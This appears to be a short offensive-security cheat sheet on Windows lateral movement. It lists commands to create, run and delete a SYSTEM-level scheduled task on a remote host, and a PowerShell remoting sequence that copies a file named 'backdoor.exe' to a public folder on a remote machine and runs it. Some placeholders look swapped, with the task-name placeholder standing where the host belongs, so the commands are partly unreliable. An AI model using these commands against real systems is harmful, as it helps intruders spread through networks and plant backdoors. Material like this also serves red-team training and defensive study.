# Lateral movement

## Scheduled task

1. Create a scheduled task to run the script on a remote host.

    ```powershell
    SCHTASKS /s TASK_NAME /RU "SYSTEM" /create /tn "HOSTNAME" /tr "cmd.exe /c COMMAND"
    ```

2. Run the script on the remote host.

    ```powershell
    SCHTASKS /s TASK_NAME /run /TN "HOSTNAME"
    ```

3. Delete the scheduled task.

    ```powershell
    SCHTASKS /s TASK_NAME /tn "HOSTNAME" /delete /f
    ```

## New-PSSession

```powershell
$session = New-PSSession -Computer COMPUTER_NAME
Invoke-Command -Session $session -ScriptBlock {COMMAND}

Copy-Item "backdoor.exe" -Destination "C:\Users\Public\" -ToSession $session

Invoke-Command -Session $session -ScriptBlock {C:\Users\Public\backdoor.exe}
```
